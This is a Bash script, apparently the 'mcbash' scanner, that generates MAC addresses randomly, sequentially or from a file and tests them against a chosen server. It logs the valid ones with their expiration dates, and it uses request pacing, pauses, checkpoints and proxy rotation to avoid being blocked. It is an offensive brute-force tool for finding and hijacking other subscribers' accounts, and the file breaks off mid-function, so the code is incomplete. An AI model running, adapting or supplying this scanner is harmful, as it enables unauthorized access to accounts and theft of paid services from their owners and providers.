#!/bin/bash
CONF_DEST="${HOME}/.config/mcbash"
ALT_CONF_DEST="/etc"

_RED=$(tput setaf 1)
_GREEN=$(tput setaf 2)
_YELLOW=$(tput setaf 3)
_BLUE=$(tput setaf 4)
_MAGENTA=$(tput setaf 5)
_CYAN=$(tput setaf 6)
_WHITE=$(tput setaf 7)
_RESET=$(tput sgr0)
_BOLD=$(tput bold)
_DIM=$(tput dim)
_ERASE="\r\033[0K" #Cursor to EOL (\r resets cursor to left)
_ERASE_UP="\r\033[1A" #Erase one line up

check_dependencies() {
	#dep=("curl" "echo" "tput")
	dep=("curl")
	for d in ${dep[@]}; do
		if ! [[ $(which $d 2>/dev/null) ]]; then
			echo -e "${_BLUE}${_BOLD}INFO: mcbash needs ${_YELLOW}${d}${_BLUE} to function correctly.\nPlease install it on your machine.${_RESET}"
			exit 1
		fi
	done
}

read_args() {
	args=("$@")
	ELEMENTS=${#args[@]}
	for (( i=0;i<$ELEMENTS;i++)); do
		[[ $(echo ${args[${i}]}) == "--debug" ]] && \
			debug=true && \
			debug_verbose_curl="-vvvvvv"
		[[ $(echo ${args[${i}]}) == "--show-only-mac" ]] && \
			only_outputs_mac=true
		[[ $(echo ${args[${i}]}) == "-np" || \
			$(echo ${args[${i}]}) == "--default" ]] && \
			avoid_parameters=true
		[[ $(echo ${args[${i}]}) == "-u" || \
			$(echo ${args[${i}]}) == "--url" ]] && \
			argument_dns=$(( i + 1 )) && \
			dns=${args[${argument_dns}]} && \
			inspect_from_args "--url" "${dns}"
		[[ $(echo ${args[${i}]}) == "-w" || \
			$(echo ${args[${i}]}) == "--wait" ]] && \
			argument_request_delay=$(( i + 1 )) && \
			request_delay=${args[${argument_request_delay}]} && \
			inspect_from_args "--wait" "${request_delay}"
		[[ $(echo ${args[${i}]}) == "-t" || \
			$(echo ${args[${i}]}) == "--timeout" ]] && \
			argument_timeout=$(( i + 1 )) && \
			timeout=${args[${argument_timeout}]} && \
			inspect_from_args "--timeout" "${timeout}"
		[[ $(echo ${args[${i}]}) == "-b" || \
			$(echo ${args[${i}]}) == "--break" ]] && \
			argument_timebreak=$(( i + 1 )) && \
			timebreak=${args[${argument_timebreak}]} && \
			inspect_from_args "--break" "${timebreak}"
		[[ $(echo ${args[${i}]}) == "-d" || \
			$(echo ${args[${i}]}) == "--pause-for" ]] && \
			argument_timebreak_duration=$(( i + 1 )) && \
			timebreak_duration=${args[${argument_timebreak_duration}]} && \
			inspect_from_args "--pause-for" "${timebreak_duration}"
		[[ $(echo ${args[${i}]}) == "-s" || \
			$(echo ${args[${i}]}) == "--stop" ]] && \
			argument_stop=$(( i + 1 )) && \
			stopping=${args[${argument_stop}]} && \
			inspect_from_args "--stop" "${stopping}"
		[[ $(echo ${args[${i}]}) == "-k" || \
			$(echo ${args[${i}]}) == "--keep" ]] && \
			argument_keep_expired=$(( i + 1 )) && \
			keep_expired=${args[${argument_keep_expired}]}
		[[ $(echo ${args[${i}]}) == "--range" ]] && \
			range=true
		[[ $(echo ${args[${i}]}) == "--seq" ]] && \
			seq=true && \
			range=true
		[[ $(echo ${args[${i}]}) == "-F" || \
			$(echo ${args[${i}]}) == "--from" ]] && \
			range=true && \
			argument_range_from=$(( i + 1 )) && \
			range_from=${args[${argument_range_from}]} && \
			inspect_from_args "--from" "${range_from}"
		[[ $(echo ${args[${i}]}) == "-L" ||
			$(echo ${args[${i}]}) == "--to" ]] && \
			range=true && \
			argument_range_to=$(( i + 1 )) && \
			range_to=${args[${argument_range_to}]} && \
			inspect_from_args "--to" "${range_to}"
		[[ $(echo ${args[${i}]}) == "-P" ||
			$(echo ${args[${i}]}) == "--proxy" ]] && \
			argument_proxy_url=$(( i + 1 )) && \
			proxy_url=${args[${argument_proxy_url}]} && \
			proxy_url_option=$(echo "-x $proxy_url")
		[[ $(echo ${args[${i}]}) == "-pu" ||
			$(echo ${args[${i}]}) == "--proxy-user" ]] && \
			argument_proxy_user=$(( i + 1 )) && \
			proxy_user=${args[${argument_proxy_user}]} && \
			proxy_user_option=$(echo "--proxy-anyauth --proxy-user $proxy_user")
		[[ $(echo ${args[${i}]}) == "--proxy-file" ]] && \
			proxy_from_file=true && \
			argument_proxy_file=$(( i + 1 )) && \
			proxy_file=${args[${argument_proxy_file}]} && \
			update_proxy
		[[ $(echo ${args[${i}]}) == "--no-checkpoint" ]] && \
			no_checkpoint=true
		[[ $(echo ${args[${i}]}) == "--prefix" ]] && \
			set_prefix=true && \
			argument_set_prefix=$(( i + 1 )) && \
			prefix=${args[${argument_set_prefix}]} #&& \
			#inspect_from_args "--prefix" "${prefix}"
		[[ $(echo ${args[${i}]}) == "--mac-file" ]] && \
			read_from_file=true && \
			argument_read_from_file=$(( i + 1 )) && \
			file_to_read_mac_from=${args[${argument_read_from_file}]} && \
			inspect_from_args "--mac-file" "${file_to_read_mac_from}"
		#[[ $(echo ${args[${i}]}) == "--rm-checkpoint" ]] && \
		#	echo "Remove checkpoint file for ${dns} ?" && exit 0
		[[ $(echo ${args[${i}]}) == "-h" || $(echo ${args[${i}]}) == "--help" ]] && \
			echo -e "${_BOLD}Help menu :${_RESET} \
			\n -u ${_BLUE}URL:port${_RESET} : Server ${_BLUE}URL/IP${_RESET} and ${_BLUE}port (optional)${_RESET} \
			\n -w ${_BLUE}X${_RESET} : Wait ${_BLUE}X${_RESET} seconds between each requests \
			\n -b ${_BLUE}X${_RESET} : Make a break every ${_BLUE}X${_RESET} requests \
			\n -d ${_BLUE}X${_RESET} : Break or timeout duration (${_BLUE}X${_RESET} seconds) \
			\n -t ${_BLUE}X${_RESET} : Consider request a timeout after a delay of ${_BLUE}X${_RESET} seconds \
			\n -s ${_BLUE}X${_RESET} : Stop McBash after ${_BLUE}X${_RESET} tested MAC addresses \
			\n --seq : Scan MAC addresses sequentially \
			\n --mac-file ${_BLUE}FILE${_RESET} : Scan MAC addresses from a file \
			\n -np : Use default parameters \
			\n man mcbash : Look up the manual for more tweaks (proxy support, shell scripts call, etc.)\
			\n \
			\n ${_BOLD}Example ${_RESET}: mcbash -u my-dns.com:8080 -w 1.5 -b 10 -d 3 -s 150 -t 2 -k \
			\n Set your default parameters inside this file : \"$HOME/.config/mcbash/mcbash.conf\"\
			\n MACs are stored here : \"${destination}\"\
			" && exit 0
	done
}

inspect_from_args() {
	case "${1}" in
		"--url"|"-u"|"dns") inspect_dns "${2}" "from_args";;
		"--wait"|"-w"|"delay") inspect_float "${1}" "${2}" "from_args";;
		"--timeout"|"-t"|"timeout") inspect_float "${1}" "${2}" "from_args";;
		"--break"|"-b"|"break") inspect_int "${1}" "${2}" "from_args";;
		"--pause-for"|"-d"|"break_duration") inspect_float "${1}" "${2}" "from_args";;
		"--stop"|"-s"|"stop") inspect_int "${1}" "${2}" "from_args";;
		"--from"|"-F"|"--to"|"-L") inspect_mac "${2}" "from_args";; # is it a well formed mac
		#"--prefix") inspect_mac_prefix "${2}";;
		"--mac-file") inspect_mac_file "${2}" "from_args";;
		*) echo "${_RED}${_BOLD}Something went wrong inspecting arguments.${_RESET}";;
	esac
}

inspect_dns() {
	mode=$2
	# Check if DNS is well formed URL or IP
	#if ! [[ $(echo "${1}" | grep -Eo '((https?|ftp)://)?(.*:.*@)?([-a-zA-Z0-9]+\.)?[-a-zA-Z0-9]+\.[-a-zA-Z0-9]+((:)[0-9]{1,5})?(/.*)?') == "${1}" ||
	URL_protocol="((https?|ftp)://)?"
	URL_user_information="(.*:.*@)?"
	URL_host="([-a-zA-Z0-9]+\.)?{1,2}[-a-zA-Z0-9]+\.[a-zA-Z0-9]{2,6}"
	URL_IP="([0-9]{1,3}\.){3}[0-9]{1,3}"
	URL_host_or_IP="($URL_host|$URL_IP)"
	URL_port="(:[0-9]{1,5})?"
	URL_path="(/([-a-zA-Z0-9]+(/)?)?*)?"
	URL_query_string="(\?.*)?"
	URL_regexp=$(echo ${URL_protocol}${URL_user_information}${URL_host_or_IP}${URL_port}${URL_path}${URL_query_string})
	if ! [[ $(echo "${1}" | grep -Eo "$URL_regexp") == "${1}" ]]; then #||
		#$(echo "${1}" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}((:)[0-9]{1,5})?(/.*)?') == "${1}" ]]; then
		echo -e "${_RESET}${_RED}ERROR: invalid DNS format.${_RESET}"
		if [[ "${mode}" == "from_args" ]]; then
			exit 1
		else
			return 1
		fi
	elif [[ $(echo "${1}" | sed 's/\ //g') == "" ]]; then
		echo -e "${_RESET}${_RED}ERROR: empty DNS.${_RESET}"
		if [[ "${mode}" == "from_args" ]]; then
			exit 1
		else
			return 1
		fi
	fi
}

inspect_float() {
	mode=$3
	if ! [[ $(echo "$2" | grep -Eo '([0-9]+)?(\.)?[0-9]+') == "${2}" ]]; then
		echo -e "${_RESET}${_RED}ERROR: ${_YELLOW}${1}${_RESET}${_RED} takes float or integer for parameter (e.g. ${_YELLOW}${1} 1.5${_RED}).${_RESET}"
		if [[ "${mode}" == "from_args" ]]; then
			exit 1
		else
			return 1
		fi
	fi
	if [[ "${mode}" == "from_args" && $(echo "${2}" | sed 's/\ //g') == "" ]]; then
		echo -e "${_RESET}${_RED}ERROR: empty value for ${_YELLOW}${1}${_RED}.${_RESET}"
		exit 1
	fi
}

inspect_int() {
	mode=$3
	if ! [[ $(echo "$2" | grep -Eo '[0-9]+') == "${2}" ]]; then
		echo -e "${_RESET}${_RED}ERROR: ${_YELLOW}${1}${_RESET}${_RED} takes integer for parameter (e.g. ${_YELLOW}${1} 10${_RED}).${_RESET}"
		if [[ "${mode}" == "from_args" ]]; then
			exit 1
		else
			return 1
		fi
	fi
	if [[ "${mode}" == "from_args" && $(echo "${2}" | sed 's/\ //g') == "" ]]; then
		echo -e "${_RESET}${_RED}ERROR: empty value for ${_YELLOW}${1}${_RED}.${_RESET}"
		exit 1
	fi
}

inspect_mac () {
	mode=$2
	# If while checking USER argument : exit 1
	# Else, if reading a MAC file : return 1 for "bad MAC"
	if ! [[ $(echo "$1" | grep -Eo "([0-9a-fA-F]{2}[-:]){$(( (max_mac_length / 2) - 1 ))}[0-9a-fA-F]{2}") == "${1}" ]]; then
		if [[ ${mode} == "from_args" || ${mode} == "from_interactive" ]]; then
			echo -e "${_RESET}${_RED}ERROR: invalid MAC format.${_RESET}"
			echo -e "${_RESET}${_RED}Please use either ${_DIM}FORMAT_1${_RESET}${_RED} or ${_DIM}FORMAT_2${_RESET}${_RED} format.${_RESET}" | \
				sed -r 's/FORMAT_1/XX:XX:XX:XX:XX:XX/ ; s/FORMAT_2/XX-XX-XX-XX-XX-XX/'
			if [[ "${mode}" == "from_args" ]]; then
				exit 1
			else
				return 1
			fi
		else
			return 1
		fi
	fi
}

inspect_mac_file() {
	if ! [[ -f $(realpath "${1}") ]]; then
		echo -e "${_RED}ERROR: file ${_YELLOW}${1}${_RED} does not exist.${_RESET}"
		exit 1
	fi
}











load_config_file() {
	config_file="${CONF_DEST}/mcbash.conf"

	if [[ -f $config_file ]]; then
		# Sourcing /etc/config_file first
		# because when updates to config file, this one is ALWAYS REPLACED.
		# This way, variables not updated inside the USER config folder are loaded anyway.
		if [[ -f "${ALT_CONF_DEST}/mcbash.conf" ]]; then
			source "${ALT_CONF_DEST}/mcbash.conf"
		fi
		source "$config_file"
	else
		if [[ -f "${ALT_CONF_DEST}/mcbash.conf" ]]; then
			source "${ALT_CONF_DEST}/mcbash.conf"
		else
			echo -e "${_YELLOW}WARNING: Config file not found. This can cause weird behaviors.${_RESET}\n${_BLUE}mcbash.conf${_RESET}${_YELLOW} should be placed here : ${_BLUE}$config_file${_RESET}"
		fi
	fi
}

locate_destination_folder() {
	[ -d $destination ] || mkdir -p "$destination" &> /dev/null || \
		echo -e "${_BLUE}Can't create saving directory to $destination.\nPlease be sure you have permissions.\nValid MAC addresses will not be stored.${_RESET}"
}

dns_name() {
	[[ -z ${dns+x} ]] && read -p "Server address : "${_BOLD}${_BLUE} dns
	[[ -n ${only_outputs_mac} ]] && tput sgr0 # can't place _RESET here due to last 'read' command. Help?
	#tput sgr0 # can't place _RESET here due to last 'read' command. Help?
	[[ $dns = "" ]] && unset dns && echo -ne "\r${_RED}You need to indicate a server address [ex: my-fakedns.org:8080]${_RESET}\n" && dns_name
	#[[ $(echo $dns | grep -o 'http://') = "" ]] && dns=$(echo 'http://'$dns)
	#dns=$(echo $dns | sed 's/\/$//') # if trailing "/" at the end of DNS, remove it
	#name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///')
	name=$(echo $dns | sed "s/\/$// ; s/http:\/\/// ; s/:// ; s/\///")
	if ! inspect_dns "${dns}" "from_interactive"; then
		unset dns
		dns_name
	fi
}

quit_mcbash() {
	[[ -n ${only_outputs_mac} ]] && exit 0
	echo ""
	[[ $valid_macs_number != 0 ]] && echo ${_GREEN}"$valid_macs_number valid for $(( $item - 1 )) tested." ${_RESET}
	echo ${_CYAN}--- You have paused mcbash. What to do ? ---${_RESET}
	trap - SIGINT
	read -p "${_BOLD}${_MAGENTA}Quit [Ctrl+C]  ${_RESET}-  ${_BOLD}${_BLUE}Resume [Enter]${_RESET} " quit_mc
	( [[ $(echo $quit_mc | grep -io "y") ]] && \
		if [ $valid_macs_number != 0 ]; then
			echo ${_GREEN}"File saved => $destination/valid_macs_$name"${_RESET}
		fi && \
			exit 0 ) ||
			( ( [[ $valid_macs_number != 0 ]] && echo -ne "${_ERASE_UP}\033[0K$@${_ERASE_UP}\033[0K$@${_ERASE_UP}\033[0K$@${_ERASE_UP}\033[0K$@" ) || \
			echo -ne "${_ERASE_UP}\033[0K$@${_ERASE_UP}\033[0K$@${_ERASE_UP}\033[0K$@" )
}

scanning_text() {
	echo "${_BOLD}=> ${_RESET}Scan @ ${_BOLD}${_BLUE}$dns${_RESET} ${_GREEN}[$request_delay seconds/request]${_RESET}"
}

display_logo() {
	echo ${_GREEN} " ░█▄▒▄█░▄▀▀░██▄▒▄▀▄░▄▀▀░█▄█ " ${_RESET} && \
	echo ${_GREEN} " ░█▒▀▒█░▀▄▄▒█▄█░█▀█▒▄██▒█▒█ " ${_RESET}
}

random_mac() {
	a=(1 2 3 4 5 6 7 8 9 0 A B C D E F)
	if [[ -n ${prefix} ]]; then
		mac_prefix=${prefix}
	else
		mac_prefix=${default_mac_prefix}
	fi
	number_chars_prefix=$(( $(echo ${mac_prefix} | sed 's/://g' | wc -m) - 1 ))
	missing_mac_values=$(( max_mac_length - number_chars_prefix ))
	suffix=""
	for (( i=0;i<${missing_mac_values};i++ )); do
		suffix=$(echo $suffix)$(echo ${a[RANDOM%16]})
	done
	mac_without_colon=$(echo $mac_prefix | sed 's/://g')$(echo $suffix)
	new_mac=$(echo $mac_without_colon | sed -r 's/.{2}/&:/g ; s/:$//')

	# If --range is set, chose randomly between it
	if [[ -n ${range} ]]; then
		prev_mac=$(echo $mac)
		range_mac
		if [[ $(echo $new_mac) == $(echo $prev_mac) ]]; then
			random_mac
		fi
	fi

	# Encode mac
	mac=$(echo $new_mac)
	encoded_mac=$(echo $mac | sed 's/:/\%3A/g')
	#return
}

seq_mac() {
	[[ -n ${last_mac_reached} ]] && \
		( [[ -n ${only_outputs_mac} ]] || echo "${_BOLD}${_CYAN}Range fullfiled${_RESET}" ) && \
		exit 0
	[[ -z ${first_mac+x} ]] && first_mac="$default_first_mac" && mac=$(echo $first_mac) && return # user first value of the MAC
	[[ $item == 1 ]] && mac=$(echo $first_mac) && return

	# if not '--no-checkpoint', save that MAC in checkpoint file
	[[ -z ${no_checkpoint+x} ]] && echo "${first_mac}" > "${destination}/checkpoint_${name}"

	new_mac=$(echo $first_mac)
	mac_simple=$(echo $new_mac |  tr '[:lower:]' '[:upper:]' | tr -d ':') && \
		mac_dec=$( printf '%d\n' 0x$mac_simple ) && \
		mac_add=$( expr $mac_dec + 1 ) && \
		mac_hex=$( printf '%012X\n' $mac_add ) && \
		new_mac=$(echo $mac_hex | sed 's/../&:/g;s/:$//') && \
		first_mac=$(echo $new_mac) && \
		mac=$(echo $new_mac) && \
		[[ -n ${last_mac} && $last_mac == $mac ]] && last_mac_reached=true
	#return
	encoded_mac=$(echo $mac | sed 's/:/\%3A/g')
}

range_mac() {
	if [[ -z ${mac_low_dec+x} || -z ${mac_max_dec+x} ]]; then
		mac_low_basic=$(echo $range_from |  tr '[:lower:]' '[:upper:]' | tr -d ':')
		mac_low_dec=$( printf '%d\n' 0x$mac_low_basic )
		mac_max_basic=$(echo $range_to |  tr '[:lower:]' '[:upper:]' | tr -d ':')
		mac_max_dec=$( printf '%d\n' 0x$mac_max_basic )
	fi
	random_between_range=$(awk -v beginning=${mac_low_dec} -v finish=${mac_max_dec} 'BEGIN{srand();print int(rand()*(finish - beginning) + beginning) }')
	printf_string=$(echo "%0${max_mac_length}x\n")
	mac_hex=$(printf "${printf_string}" $random_between_range)
	new_mac=$(echo $mac_hex | tr '[:lower:]' '[:upper:]' | sed 's/../&:/g;s/:$//')
	encoded_mac=$(echo $mac | sed 's/:/\%3A/g')
}


read_mac_from_file() {
	if [[ -z ${started_reading_file+x} ]]; then
		started_reading_file=true
		line_to_read=0
		#max_number_of_lines_to_read=$(cat "$file_to_read_mac_from" | sed '/^$/d' | wc -l)
		max_number_of_lines_to_read=$(cat "$file_to_read_mac_from" | wc -l)
	fi
	if [[ $line_to_read -gt $max_number_of_lines_to_read ]]; then
		echo -e "\n${_YELLOW}End of MAC file.${_RESET}"
		exit 0
	fi
	line_to_read=$(( line_to_read + 1 ))
	mac=$(sed "${line_to_read}q;d" "$file_to_read_mac_from")
	if [[ $mac == "" ]]; then
		read_mac_from_file
	elif ! inspect_mac $mac "read_mac_from_file_function"; then
		read_mac_from_file
	fi
	encoded_mac=$(echo $mac | sed 's/:/\%3A/g')
}

generate_mac() {
	if [[ -n ${read_from_file} ]]; then
		read_mac_from_file
	else
		[[ -n ${seq} ]] && seq_mac
		[[ -z ${seq+x} ]] && random_mac
	fi
}

valid_mac_found() {
	if [[ $valid_macs_number == 0 ]]; then
		echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
	fi
	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
	if [[ -n ${only_outputs_mac} ]]; then
		echo $mac
	else
		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n"
	fi
	valid_macs_number=$(( $valid_macs_number + 1 ))
}

check_parameters() {
	if [ "$avoid_parameters" = true ]; then
		populate_necessary_values
	fi

	[[ -z ${request_delay+x} && \
		-z ${timebreak+x} && \
		-z ${timebreak_duration+x} && \
		-z ${stopping+x} && \
		-z ${timeout+x} ]] && \
		#-z ${keep_expired+x} ]] && \
		read -p "${_BOLD}=>${_RESET} Adjust parameters? ${_BOLD}[y/N]${_RESET} " PARAMETERS

	if [[ $(echo $PARAMETERS | grep -io "y") ]]; then
		ask_request_delay
		ask_timebreak
		ask_timebreak_duration
		ask_stopping
		ask_timeout
		ask_mode
		ask_range
		ask_keep_expired
		echo " ${_RESET}"
		#user_asks_parameters

	elif [[ -n ${range} || -n ${range_from} || -n ${range_to} ]]; then
		if [[ -f "${destination}/checkpoint_${name}" && -z ${no_checkpoint+x} && -z ${range_from+x} ]]; then
			checkpoint_mac=$(cat "${destination}/checkpoint_${name}")
			echo "${_RESET} ${_GREEN}Checkpoint detected!${_RESET} Starting from ${_GREEN}${checkpoint_mac}${_RESET} (last MAC scanned)"
			range_from=${checkpoint_mac}
		fi
		[[ -n ${range_from} ]] || ask_first_mac
			#read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac
		[[ -n ${range_from} ]] && first_mac=$range_from
		[[ -z ${first_mac} ]] && first_mac=$default_first_mac && range_from="$default_first_mac"
		[[ -n ${first_mac} ]] && range_from=$first_mac
		[[ -n ${range_to} ]] || ask_last_mac
			#read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac
		[[ -n ${range_to} ]] && last_mac=$range_to
		[[ -z $last_mac ]] && last_mac="$default_last_mac" && range_to="$default_last_mac"
		[[ -n ${last_mac} ]] && range_to=$last_mac
		[[ -n ${request_delay} ]] || request_delay=$default_request_delay
		[[ -n ${timebreak} ]] || timebreak=$default_timebreak
		[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
		[[ -n ${timeout} ]] || timeout=$default_timeout

	else
		[[ -n ${request_delay} ]] || request_delay=$default_request_delay
		[[ -n ${timebreak} ]] || timebreak=$default_timebreak
		[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
		[[ -n ${timeout} ]] || timeout=$default_timeout
		if [[ -n ${range} || -n ${range_from} || -n ${range_to} ]]; then
			range=true
			if [[ -f "${destination}/checkpoint_${name}" && -z ${no_checkpoint+x} ]]; then
				checkpoint_mac=$(cat "${destination}/checkpoint_${name}")
				default_first_mac=${checkpoint_mac}
			fi
			[[ -n ${range_from} ]] || range_from=$default_first_mac && first_mac=$default_first_mac
			[[ -n ${range_to} ]] || range_to=$default_last_mac && last_mac=$default_last_mac
		fi
		return
	fi
}


ask_request_delay() {
	[[ -z ${request_delay+x} ]] && \
		read -p " ${_BOLD}*${_RESET} Wait ${_GREEN}[X] ${_RESET}seconds between two requests ${_BOLD}[default:$default_request_delay]${_RESET} ${_BOLD}${_GREEN}" request_delay

	if [[ $request_delay == "" ]]; then
		request_delay=$default_request_delay
	else
		if ! inspect_float "--wait" $request_delay "from_interactive"; then
			unset request_delay
			ask_request_delay
		fi
	fi
}

ask_timebreak() {
	[[ -z ${timebreak+x} ]] && \
		read -p "${_RESET} ${_BOLD}*${_RESET} Make a break every ${_GREEN}[X]${_RESET} requests ${_BOLD}[$default_timebreak]${_RESET} ${_BOLD}${_GREEN}" timebreak

	if [[ $timebreak == "" ]]; then
		timebreak=$default_timebreak
		[[ $timebreak == "0" ]]
		unset timebreak
	else
		if ! inspect_int "--break" $timebreak "from_interactive"; then
			unset timebreak
			ask_timebreak
		fi
	fi
}

ask_timebreak_duration() {
	[[ -z ${timebreak_duration+x} && $timebreak != "" ]] && \
		read -p "${_RESET} ${_BOLD}*${_RESET} Break duration (seconds) ${_BOLD}[$default_timebreak_duration]${_RESET} ${_BOLD}${_GREEN}" timebreak_duration

	if [[ $timebreak_duration == "" ]]; then
		timebreak_duration=$default_timebreak_duration
	else
		if ! inspect_float "--pause-for" $timebreak_duration "from_interactive"; then
			unset timebreak_duration
			ask_timebreak_duration
		fi
	fi
}

ask_stopping() {
	[[ -z ${stopping+x} ]] && \
		read -p "${_RESET} ${_BOLD}*${_RESET} Stop McBash after ${_GREEN}[X]${_RESET} tested MAC addresses ${_BOLD}[$default_stopping]${_RESET} ${_BOLD}${_GREEN}" stopping

	if [[ $stopping == "" ]]; then
		stopping=$default_stopping
		if [[ $stopping == "0" ]]; then
			unset stopping
		fi
	else
		if ! inspect_int "--stop" $stopping "from_interactive"; then
			unset stopping
			ask_stopping
		fi
	fi
}

ask_timeout() {
	[[ -z ${timeout+x} ]] && \
		read -p "${_RESET} ${_BOLD}*${_RESET} Consider request a timeout after ${_GREEN}[X]${_RESET} seconds ${_BOLD}[$default_timeout]${_RESET} ${_BOLD}${_GREEN}" timeout

	if [[ $timeout == "" ]]; then
		timeout=$default_timeout
	else
		if ! inspect_float "--timeout" $timeout "from_interactive"; then
			unset timeout
			ask_timeout
		fi
	fi
}

ask_mode() {
	#[[ -z ${range+x} ]] && \
	[[ -z ${seq+x} ]] && \
		read -p "${_RESET} ${_BOLD}*${_RESET} Scan ${_GREEN}randomly [r]${_RESET} or ${_GREEN}sequentially [s]${_RESET} ${_BOLD}[r]${_RESET} ${_BOLD}${_GREEN}" mode
	#[[ $(echo $mode | grep -io "s") ]] && range=true
	[[ $(echo $mode | grep -io "s") ]] && seq=true

	#[[ -z ${range+x} ]] && \
	[[ -z ${seq+x} ]] && \
		echo -e "${_RESET} ${_BOLD}*${_RESET} You have selected ${_GREEN}random mode${_RESET}"

	if [[ -z ${range+x} && -z ${seq+x} && -z ${prefix} ]]; then
		read -p "${_RESET} ${_BOLD}->${_RESET} Indicate MAC to scan prefix ${_BOLD}[$default_mac_prefix]${_RESET} ${_BOLD}${_GREEN}" prefix
		if [[ ${prefix} == "" ]]; then
			unset prefix
		fi
	fi

	#[[ -n ${range} ]] && \
	[[ -n ${seq} ]] && \
		echo -e "${_RESET} ${_BOLD}*${_RESET} You have selected ${_GREEN}sequential mode${_RESET}" && \
		range=true
}

ask_first_mac() {
	read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac

	if ! [[ "${first_mac}" == "" ]]; then
		if ! inspect_mac $first_mac "from_interactive"; then
			unset first_mac
			ask_first_mac
		fi
	fi
}

ask_last_mac() {
	read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac

	if ! [[ "${last_mac}" == "" ]]; then
		if ! inspect_mac $last_mac "from_interactive"; then
			unset last_mac
			ask_last_mac
		fi
	fi
}

ask_range() {
	if [[ -n ${range} && -z ${range_from+x} ]]; then
		if [[ -f "${destination}/checkpoint_${name}" && -z ${no_checkpoint+x} ]]; then
			checkpoint_mac=$(cat "${destination}/checkpoint_${name}")
			read -p "${_RESET} ${_BOLD}->${_RESET} Checkpoint! Continue were scan previously stopped ? (${_GREEN}${checkpoint_mac}${_RESET}) ${_BOLD}[Y/n/reset]${_RESET} ${_BOLD}${_GREEN}" grab_checkpoint
			if [[ $(echo $grab_checkpoint | grep -io "n") ]]; then
				no_checkpoint=true
				ask_first_mac
			elif [[ $(echo $grab_checkpoint | grep -io "reset") ]]; then
				echo -e "${_RESET} ${_BOLD}*${_RESET} Checkpoint will be ${_GREEN}reset${_RESET}."
				ask_first_mac
			else
				first_mac=${checkpoint_mac}
			fi
		else
			ask_first_mac
		fi
	fi
	[[ -n ${range_from} ]] && first_mac=$range_from
	[[ -z ${first_mac} ]] && first_mac=$default_first_mac
	[[ -n ${first_mac} ]] && range_from=$first_mac
	[[ -n ${range} && -z ${range_to+x} ]] && ask_last_mac
	[[ -z ${last_mac} ]] && last_mac=$default_last_mac
	[[ -n ${last_mac} ]] && range_to=$last_mac
}

ask_keep_expired() {
	if [[ $keep_expired == "" || $(echo $keep_expired | grep -io "n") ]]; then
		unset keep_expired
	fi
}

populate_necessary_values() {
	[[ -n ${request_delay} ]] || request_delay=$default_request_delay
	[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
	[[ -n ${timeout} ]] || timeout=$default_timeout
	if [[ -n ${range} ]]; then
	#if [[ -n ${seq} ]]; then
		[[ -n ${range_from} ]] || range_from=$default_first_mac
		[[ -n ${range_to} ]] || range_to=$default_last_mac
	fi
}


update_proxy() {
	# Change current proxy
	if [[ -n "${proxy_from_file}" ]]; then
		proxy_from_file
		proxy_url_option=$(echo "-x $proxy_url")
		echo -e "${_ERASE}${_DIM}Rotated proxy to '${_BLUE}${proxy_url}${_RESET}${_DIM}'${_RESET}"
	fi
}

exclude_proxy() {
	# If proxy leads to timeout => exclude from list
	echo "TODO"
}

proxy_from_file() {
	# Grabing proxy IP:PORT from file line by line
	if [[ -z "${started_reading_from_proxy_file+x}" ]]; then
		started_reading_from_proxy_file=true
		current_proxy_line=0
	fi
	current_proxy_line=$(( current_proxy_line + 1 ))
	if [[ "${current_proxy_line}" -gt $(cat "${proxy_file}" | wc -l) ]]; then
		current_proxy_line=1
	fi
	proxy_url=$(sed "${current_proxy_line}q;d" "${proxy_file}")
}

check_if_time_to_stop() {
	if [[ -n ${stopping} && $item -eq $stopping ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo "${_BOLD}${_CYAN}$valid_macs_number valid out of $item MACs.${_RESET}"
		fi
		exit 0
	fi
}

check_if_timebreak() {
	if [[ ${timebreak} -ne 0 && $(expr $(( $item )) % $timebreak ) == 0 ]]; then
		if [[ -z ${only_outputs_mac+x} ]]; then
			echo -ne ${_BLUE}"\r[$item] $mac ${_RESET}${_DIM}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET}
		fi
		sleep $timebreak_duration
	else
		sleep $request_delay
	fi
}


handshake_token_is_empty() {
	if [[ $handshake_token = "" || $(echo $handshake_token | grep null) ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}"
		fi
		return 0
	fi
	return 1
}


check_if_timeout_limit() {
	#if [[ -z "${proxy_from_file+x}" && $consecutive_timeout_number -ge $consecutive_timeout_limit ]]; then
	if [[ -z "${proxy_from_file+x}" ]]; then
		if [[ $consecutive_timeout_number -ge $consecutive_timeout_limit && \
			$consecutive_timeout_limit -ne 0 ]]; then
			echo -e "${_ERASE}${_YELLOW}Limit of consecutive timeouts allowed reached [$consecutive_timeout_number].${_RESET}" #TODO
			exit 1
		elif [[ $total_timeout_number -ge $total_timeout_limit &&\
			$total_timeout_limit -ne 0 ]]; then
			echo -e "${_ERASE}${_YELLOW}Limit of total timeouts allowed reached [$total_timeout_number].${_RESET}" #TODO
			exit 1
		fi
	fi
}

last_request_failed() {
	unset mac_not_changed
	#if [[ -n "${proxy_from_file}" && $consecutive_timeout_number -ge $consecutive_timeout_limit ]]; then
	if [[ -n "${proxy_from_file}" ]]; then
		if [[ $consecutive_timeout_number -ge $consecutive_timeout_limit && \
			$consecutive_timeout_limit -ne 0 ]]; then
			update_proxy
			consecutive_timeout_number=0
			total_timeout_number=0
